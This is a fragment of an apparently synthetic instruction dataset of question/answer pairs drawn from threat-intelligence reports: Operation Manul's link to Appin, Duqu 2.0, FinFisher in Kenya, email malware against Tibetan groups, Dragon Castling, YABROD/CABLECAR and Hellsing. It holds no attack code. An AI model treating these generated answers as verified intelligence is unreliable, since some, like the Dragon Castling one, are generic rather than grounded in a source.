    "output": "Answer: The technical evidence linking Operation Manul to Appin involves the analysis of command and control (C2) domains used by Operation Manul. Using Passive Total, it was observed that the C2 domains from Operation Manul used a total of 76 IPs from 2008-07-20 to 2016-05-11. By comparing historical data from known APT domains with the historical data from Operation Manul domains, overlaps were observed between Operation Manul and Appin. Appin is an Indian company that allegedly provides offensive cyber-capability on a contract basis. Direct overlaps were found for two of the Operation Manul domains, and indirect overlaps (same IP, at different times) with 110 of the Operation Hangover domains and all but two of the domains associated with Operation Manul. Additionally, the use of the HackBack Trojan, which is in the same malware family as the Trojan linked to Appin, further supports this connection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: EXECUTIVE SUMMARY\nEarlier this year, during a security sweep, Kaspersky Lab detected a cyber intrusion affecting several of its internal systems.\nFollowing this finding, we launched a large-scale investigation, which led to the discovery of a new malware platform from one of the most skilled, mysterious and powerful groups in the APT world \u2013 Duqu. The Duqu threat actor went dark in 2012 and was believed to have stopped working on this project - until now. Our technical analysis indicates the new round of attacks include an updated version of the infamous  12011 Duqu malware, sometimes referred to as the step-brother of  2Stuxnet.  We named this new malware and its associated platform \"Duqu 2.0\".\nVictims of Duqu 2.0 have been found in several places, including western countries, the Middle East and Asia. The actor appears to compromise both final and utilitarian targets, which allow them to improve their cyber capabilities.\nMost notably, some of the new 2014-2015 infections are linked to the P5+1 events and venues related to the negotiations with Iran about a nuclear deal. The threat actor behind Duqu appears to have launched attacks at the venues for some of these high level talks. In addition to the P5+1 events, the Duqu 2.0 group has launched a similar attack in relation to the  370th anniversary event of the liberation of Auschwitz-Birkenau.\nIn the case of Kaspersky Lab, the attack took advantage of a zero-day (CVE-2015-2360) in the WindowsKernel, patched by Microsoft on June 9 2015 and possibly up to two other, currently patched vulnerabilities, which were zeroday at that time.\n1\n2\n3\nAnswer this question: Why did the Duqu 2.0 threat actor target specific high-level events such as the P5+1 negotiations and the 70th anniversary of the liberation of Auschwitz-Birkenau? How does this strategy benefit their cyber espionage operations?",
    "output": "The Duqu 2.0 threat actor targeted specific high-level events such as the P5+1 negotiations and the 70th anniversary of the liberation of Auschwitz-Birkenau to gain access to sensitive information and enhance their cyber capabilities. By compromising both final and utilitarian targets at these events, the actors could gather intelligence related to the negotiations with Iran about a nuclear deal and other significant geopolitical matters. This strategy allows them to stay informed about critical developments and potentially influence outcomes, demonstrating their sophisticated approach to cyber espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: National Intelligence Service\nWe found a FinFisher server in a range of IP addresses registered to a Kenyan user named \"National Security Intelligence.\" Kenya's National Intelligence Service (NIS) was formerly known as the National Security Intelligence Service (NSIS).\nKenya's NSIS replaced the former Directorate of Security Intelligence (DSI), commonly known as the \"Special Branch\". The NIS is known as one of Kenya's security institutions with the biggest budgetary allocation\u2014along with the Kenya National Defence Forces and the National Police Service\u2014and considered to be among the country's critical security organs in the new constitution. In 2014, Human Rights Watch named the NIS, as well as the Anti\u00adTerrorism Police Unit and other Kenyan intelligence agencies, as being implicated in abuses including torture, disappearances, and extrajudicial killings.\nThe powers of the NIS were expanded significantly in December 2014 when the Parliament of Kenya rushed to pass the controversial Security Laws (Amendment) Bill.The amendments came following a series of deadly terrorist attacks by the militant group al\u00adShabab, including the 2013 killing of 67 people at the Westgate shopping mall in Nairobi. This bill expanded the powers of the NIS to monitor communications without a warrant, as well as expanding their powers to search and seize private property. Article 62 of the amended bill authorized NIS agents to \"do anything necessary to preserve national security\" and to detain individuals on simply the suspicion of engaging in acts which pose a threat to national security. Section 66 of the bill amended the National Intelligence Services Act, permitting the Director General of the NIS to monitor communications or \"obtain any information, material, record, document or thing\" in order to protect national security, without court oversight, leading rights organization Article 19 to argue that the amendment \"effectively [gives] carte blanche to the Director\u00adGeneral to order mass surveillance of online communications\".While a court ruling in February 2015 struck down some provisions of the amendment, the provisions enhancing the powers of the NIS remained.\nQ: How did the expansion of the National Intelligence Service's (NIS) powers in Kenya, as outlined in the Security Laws (Amendment) Bill of December 2014, potentially impact the use of FinFisher spyware?",
    "output": "The expansion of the National Intelligence Service's (NIS) powers in Kenya through the Security Laws (Amendment) Bill of December 2014 significantly increased their ability to conduct surveillance without judicial oversight. Specifically, Article 62 of the amended bill authorized NIS agents to 'do anything necessary to preserve national security' and to detain individuals based merely on suspicion of posing a threat to national security. Additionally, Section 66 of the bill amended the National Intelligence Services Act, allowing the Director General of the NIS to monitor communications or obtain any information without court oversight. This effectively gave the NIS broad authority to engage in mass surveillance, including the potential use of FinFisher spyware, raising concerns about privacy and human rights abuses. While some provisions of the amendment were struck down by a court ruling in February 2015, the enhanced powers of the NIS remained intact, highlighting the potential for misuse of sophisticated surveillance tools like FinFisher.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 5 Implications\nOur study primarily focuses on threats that groups working on human rights issues related to Tibet or China are currently facing. While our dataset is concentrated on these types of groups, our results have implications for\nhow CSOs can protect themselves against email-based targeted malware.\nSpecifically, we find that moving towards cloud-based platforms (e.g., Google Docs) instead of relying on email attachments would prevent more than 95% of the e-mail malware seen by 2 out of 3 Tibetan groups that had more than 50 e-mail submissions.\nFurther, our results highlight the potential for lower-cost user education initiatives to guard against sophisticated social engineering attacks, rather than high cost technical solutions. This observation stems from the fact that much of the malware we observe is not technically sophisticated, but rather relies on social engineering to deliver its payload by convincing users to open malicious attachments or links. Other studies [35, 36, 38] that have revealed the use of commercial malware products against CSOs and journalists have shown that many of these cases also rely on duping users into opening malicious e-mail attachments or social engineered instant messaging conversations. These incidents show that even advanced targeted malware requires successful exploitation of users through social engineering tactics.\nUser education can be a powerful tool against the kinds of targeted attacks we observed in this study. Indeed, the Tibetan community has taken an active approach with campaigns that urge Tibetan users to not send or open attachments and suggests alternative cloud based options such as Google Docs and Dropbox for sharing documents [53]. We have also engaged the Tibetan groups in a series of workshops to introduce training curriculum which draws on examples submitted by organizations participating in our study. We have also provided them with technical background to identify suspicious e-mail headers and how to use free services to check the validity of suspicious links in e-mail messages.\nThe mitigation strategies presented here are focused on email vectors and do not consider all of the possible attacks these groups may face. We highlight these strategies in particular because the majority of groups in our study identified document-based targeted malware as a high priority information security concern. The adversaries behind these attacks are highly motivated and will likely adapt their tactics as users change their behaviors. For example, it is plausible that if every user in a particular community began to avoid opening attachments and document-based malware infected fewer targets, attackers may move on to vectors such as waterhole attacks or attacks on cloud document platforms to fill the gap. User education and awareness raising activities need to be ongoing efforts that are informed by current research on the state of threats particular communities are experiencing. Evaluation of the effectiveness of user education efforts in at risk communities and corresponding reactions from attackers is required to understand the dynamics between\nthese processes.\nBig Headline: 6 Related Work\nThere is a wide body of literature on filtering and detection methods for spam [27,42,45,52,70,71] and phishing emails and websites [12, 34, 39, 69]. Attention has also been given to evaluating user behavior around phishing attacks and techniques for evading them [6, 30, 33]. By comparison research on detecting email vectors used for targeted malware attacks is limited. A notable exception is [4, 5], which uses threat and recipient features with a random forest classifier to detect targeted malicious emails in a dataset from a large Fortune 500 company. Other work has focused on imporoving detection of documents (e.g. PDF, Microsoft Office) with embedded malicious code [13,51,57]\nAnother area of research explores methods for modeling the stages of targeted attacks and using these models to develop defenses. Guira and Wang [19] propose a conceptual attack model called the attack pyramid to model targeted attacks and identify features that can be detected at the various stages. Hutchins, Cloppert and Amin, [24] use a kill chain model to track targeted attack campaigns and inform defensive strategies.\nMetrics have been developed to characterize security vulnerabilities and their severity [7, 41, 50]. The industry standard is the Common Vulnerability Scoring System (CVSS) [17], which uses three metric groups for characterizing vulnerabilities and their impacts. These groups are: base metric group (the intrinsic and fundamental characteristics of a vulnerability that are constant over time and user environments), temporal metric group (characteristics of a vulnerability that change over time but not among user environments) and environmental metric group (characteristics of a vulnerability that are relevant and unique to a particular user's environment). The CVSS is a widely adopted metric, but only rates technical vulnerabilities. Targeted attacks rely on a user action of opening a malicious attachment or visiting a malicious link to successfully compromise a system. Therefore, the sophistication of message lures and other social engineering tactics are an important part of determining the severity of a targeted attack. Systems like the CVSS cannot address this contextual component.\nOur study makes the following contributions to the literature. Previous studies of targeted attacks against CSOs usually focus on particular incidents or campaigns and do not include longitudinal observations of attacks against a range of CSO targets. While standards exist for rating the sophistication of technical vulnerabilities and research has been done on detecting targeted malware attacks and modeling campaigns, there is no scoring system that considers both the sophistication of mal-\nware and social engineering tactics used in targeted malware attacks. We address this gap through development of the TTI and validate the metric against four years of data collected from 10 CSOs.\nBig Headline: 7 Conclusions\nOur study provides an in-depth look at targeted malware threats faced by CSOs. We find that considering the technical sophistication of these threats alone is insuf-ficient and that educating users about social engineering tactics used by adversaries can be a powerful tool for improving the security of these organizations. Our results point to simple steps groups can take to protect themselves from document-based targeted malware such as shifting to cloud-based document platforms instead of relying on attachments which can contain exploits. Further research is needed to measure the effectiveness of education strategies for changing user behaviour and how effective these efforts are in mitigation of document-based malware for CSOs. Further work is also required in monitoring how attackers adapt tactics in response to observed behavioural changes in targeted communities.\nIn ongoing work we are continuing our collection of emails and NIDS alerts as well as monitoring other attacks against these groups (e.g., waterhole attacks and DoS attacks) to understand how threats vary based on their delivery mechanism. We are also working to extend our methodology to more diverse CSO communities such as those in Latin America, Africa, and other underreported regions to better document the politically motivated digital threats they may be experiencing.\nAnswer this question: What are some potential adaptations attackers might make if users change their behavior to avoid opening email attachments?",
    "output": "If users in a particular community begin to avoid opening attachments and document-based malware infects fewer targets, attackers may adapt their tactics. They could shift to other vectors such as waterhole attacks or attacks on cloud document platforms to continue compromising their targets. This underscores the need for ongoing user education and awareness-raising activities informed by current research on the state of threats particular communities are experiencing.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Operation Dragon Castling APT use Privilege Escalation to achieve its objectives, specifically in the context of the COM Session Moniker Privilege Escalation technique used by Dropper 2?",
    "output": "Privilege Escalation is a critical component of many advanced persistent threats (APTs), including Operation Dragon Castling. It involves techniques used by adversaries to gain higher-level permissions on a system or network. In the case of Operation Dragon Castling, the APT uses the COM Session Moniker Privilege Escalation technique in Dropper 2 to escalate privileges. This technique allows the malware to gain elevated access to the system, which is necessary for the APT to achieve its objectives, such as installing additional malware components and establishing persistence. Specifically, the COM Session Moniker Privilege Escalation technique exploits a vulnerability in the Windows COM session moniker to elevate privileges. By using this technique, the APT can gain SYSTEM/root level access, which provides unrestricted access to the system. This level of access enables the APT to perform a range of malicious activities, including installing additional malware components, modifying system settings, and stealing sensitive data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the YABROD downloader utilize a PDF file in its infection chain, and what role does the CABLECAR launcher play in this process?",
    "output": "The YABROD downloader contains an embedded, password-protected PDF stored in a PE resource named PDF. This PDF serves as a decoy document, displaying relevant content to the victim, but it also contains a shellcode payload and data used to generate an XOR key to decode the shellcode. YABROD itself does not decode and execute the shellcode from the PDF; instead, it relies on a second-stage binary called CABLECAR to do so. CABLECAR parses the PDF to identify a 16-byte key and the embedded shellcode payload, then uses a substitution table from the CABLECAR binary to generate an XOR key to decode the shellcode payload from the PDF. Finally, CABLECAR attempts to inject the decoded shellcode into a specific process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What was the purpose of the 'test.exe' tool deployed by the Hellsing APT group? How does the presence of debug paths in this tool provide insights into the group's operations?",
    "output": "The 'test.exe' tool was used by the Hellsing APT group to gather information and test available proxies. The presence of debug paths in this tool, such as 'D:\\Hellsing\\release\\exe\\exe\\test.pdb', provides valuable insights into the development environment and organizational structure of the Hellsing group. These paths indicate the locations where the malware was developed and compiled, offering clues about the group's operational setup and potential vulnerabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  }
]